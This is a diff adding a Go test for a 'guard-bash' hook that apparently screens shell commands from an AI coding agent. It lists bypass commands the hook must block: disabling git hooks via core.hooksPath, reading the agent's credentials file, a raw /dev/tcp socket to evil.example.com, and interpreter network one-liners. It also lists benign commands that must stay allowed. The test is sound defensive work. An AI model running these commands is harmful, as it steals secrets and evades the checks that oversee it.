@@ -182,3 +182,43 @@ func TestProtectPathsBlocksFrozenContract(t *testing.T) {
 		})
 	}
 }
+
+// TestGuardBashBlocksBypassClasses (phase-1 review H3/H4): each named bypass
+// class — spacing tricks, alternate privilege tools, hook-path redirects
+// (case-folded: git config keys are case-insensitive), credential reach,
+// raw-socket and interpreter one-liner egress — must be BLOCKED, while the
+// everyday benign shapes that sit closest to each pattern stay allowed.
+func TestGuardBashBlocksBypassClasses(t *testing.T) {
+	hook := absHook(t, "guard-bash")
+
+	blocked := []string{
+		"git  push   --force origin main",               // spacing bypass (H4)
+		"git\tpush\t--force",                            // tab separator (H4)
+		"doas rm x",                                     // alternate privilege tool (H4)
+		"git -c core.hooksPath=/dev/null commit -m x",   // hook redirect (H4)
+		"git config core.HOOKSPATH /tmp/empty",          // case-folded key (H4)
+		"cat /root/.claude/.credentials.json",           // cred reach past the Read deny (H3)
+		"sh -c 'exec 3<>/dev/tcp/evil.example.com/443'", // raw-socket egress (H3)
+		"python3 -c 'import urllib.request'",            // interpreter one-liner egress (H3)
+		"perl -e 'use IO::Socket;'",                     // interpreter one-liner egress (H3)
+	}
+	for _, c := range blocked {
+		if runHook("", nil, hook, c) == nil {
+			t.Errorf("guard-bash should BLOCK: %q", c)
+		}
+	}
+
+	benign := []string{
+		"git push origin feat/x",
+		"git commit -m \"force of habit\"",
+		"grep -e pattern file.txt", // -e here is grep's, not perl's
+		"python3 script.py",
+		"node server.js",
+		"rm -rf ./build",
+	}
+	for _, c := range benign {
+		if err := runHook("", nil, hook, c); err != nil {
+			t.Errorf("guard-bash should allow: %q (%v)", c, err)
+		}
+	}
+}
